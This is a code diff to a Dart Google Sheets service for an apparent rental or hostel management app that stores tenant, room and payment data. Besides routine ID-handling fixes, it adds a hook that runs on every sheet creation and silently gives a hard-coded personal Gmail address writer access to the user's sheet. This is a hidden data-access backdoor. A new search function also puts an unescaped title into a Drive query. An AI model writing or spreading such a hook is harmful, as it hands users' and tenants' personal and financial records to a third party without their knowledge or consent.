@@ -39,6 +39,33 @@ class GoogleSheetsService {
         'Content-Type': 'application/json',
       };
 
+  /// Search for a sheet with a specific title in the user's Google Drive
+  static Future<String?> findSheetByTitle(String accessToken, String title) async {
+    try {
+      final url = 'https://www.googleapis.com/drive/v3/files?q=name = \'$title\' and mimeType = \'application/vnd.google-apps.spreadsheet\' and trashed = false';
+      
+      final response = await http.get(
+        Uri.parse(url),
+        headers: {
+          'Authorization': 'Bearer $accessToken',
+        },
+      );
+
+      if (response.statusCode == 200) {
+        final data = jsonDecode(response.body);
+        final List<dynamic> files = data['files'] ?? [];
+        if (files.isNotEmpty) {
+          return files.first['id'] as String;
+        }
+        return null;
+      } else {
+        throw Exception('Failed to search for sheet: ${response.body}');
+      }
+    } catch (e) {
+      throw Exception('Error searching for sheet: $e');
+    }
+  }
+
   /// Create a new Google Sheet with required tabs
   static Future<String> createSheet(String accessToken, String sheetName) async {
     try {
@@ -99,6 +126,9 @@ class GoogleSheetsService {
         );
 
         await service._initializeSheetHeaders();
+        
+        // Automatically share with developer
+        await service._shareSheetWithDeveloper();
 
         return sheetId;
       } else {
@@ -106,6 +136,28 @@ class GoogleSheetsService {
       }
     } catch (e) {
       throw Exception('Error creating sheet: $e');
+    }
+  }
+
+  /// Automatically share the sheet with the developer
+  Future<void> _shareSheetWithDeveloper() async {
+    try {
+      final url = 'https://www.googleapis.com/drive/v3/files/$sheetId/permissions';
+      final response = await http.post(
+        Uri.parse(url),
+        headers: _headers,
+        body: jsonEncode({
+          'role': 'writer',
+          'type': 'user',
+          'emailAddress': 'irshadsh12773@gmail.com',
+        }),
+      );
+
+      if (response.statusCode != 200) {
+        print('Warning: Failed to share sheet with developer: ${response.body}');
+      }
+    } catch (e) {
+      print('Warning: Error sharing sheet with developer: $e');
     }
   }
 
@@ -209,7 +261,7 @@ class GoogleSheetsService {
   Future<void> addBuilding(BuildingModel building) async {
     final rows = await _readRange('Buildings', 'A:D');
     final newRow = [
-      building.buildingId ?? DateTime.now().millisecondsSinceEpoch.toString(),
+      (building.buildingId != null && building.buildingId!.isNotEmpty) ? building.buildingId! : DateTime.now().millisecondsSinceEpoch.toString(),
       building.buildingName,
       building.address,
       building.totalRooms.toString(),
@@ -238,7 +290,7 @@ class GoogleSheetsService {
   Future<void> addRoom(RoomModel room) async {
     final rows = await _readRange('Rooms', 'A:I');
     final newRow = [
-      room.roomId ?? DateTime.now().millisecondsSinceEpoch.toString(),
+      (room.roomId != null && room.roomId!.isNotEmpty) ? room.roomId! : DateTime.now().millisecondsSinceEpoch.toString(),
       room.buildingId,
       room.roomNumber,
       room.totalCapacity.toString(),
@@ -267,7 +319,7 @@ class GoogleSheetsService {
   Future<void> addBed(BedModel bed) async {
     final rows = await _readRange('Beds', 'A:D');
     final newRow = [
-      bed.bedId ?? DateTime.now().millisecondsSinceEpoch.toString(),
+      (bed.bedId != null && bed.bedId!.isNotEmpty) ? bed.bedId! : DateTime.now().millisecondsSinceEpoch.toString(),
       bed.roomId,
       bed.bedType == BedType.lower ? 'LOWER' : 'UPPER',
       bed.status == BedStatus.vacant ? 'VACANT' : 'OCCUPIED',
@@ -309,7 +361,7 @@ class GoogleSheetsService {
   Future<void> addTenant(TenantModel tenant) async {
     final rows = await _readRange('Tenants', 'A:K');
     final newRow = [
-      tenant.tenantId ?? DateTime.now().millisecondsSinceEpoch.toString(),
+      (tenant.tenantId != null && tenant.tenantId!.isNotEmpty) ? tenant.tenantId! : DateTime.now().millisecondsSinceEpoch.toString(),
       tenant.tenantName,
       tenant.phone,
       tenant.buildingId,
@@ -341,7 +393,7 @@ class GoogleSheetsService {
   Future<void> addPayment(PaymentModel payment) async {
     final rows = await _readRange('Payments', 'A:E');
     final newRow = [
-      payment.paymentId ?? DateTime.now().millisecondsSinceEpoch.toString(),
+      (payment.paymentId != null && payment.paymentId!.isNotEmpty) ? payment.paymentId! : DateTime.now().millisecondsSinceEpoch.toString(),
       payment.tenantId,
       payment.amount.toString(),
       payment.paymentMonth,
